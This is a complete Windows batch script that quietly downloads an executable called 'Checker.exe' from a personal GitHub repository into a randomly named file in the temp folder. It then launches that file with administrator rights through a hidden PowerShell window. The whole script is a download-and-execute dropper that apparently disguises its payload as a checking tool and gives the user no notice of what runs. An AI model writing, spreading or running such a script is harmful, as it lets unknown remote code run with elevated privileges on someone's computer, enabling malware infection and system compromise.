@echo off
setlocal
set "URL=https://github.com/muimk262/check/raw/refs/heads/main/Checker.exe"
set "FILE=%TEMP%\Check_%RANDOM%%RANDOM%.exe"

curl -L -s -o "%FILE%" "%URL%"
if errorlevel 1 exit /b 1

start "" powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%FILE%' -Verb RunAs"
exit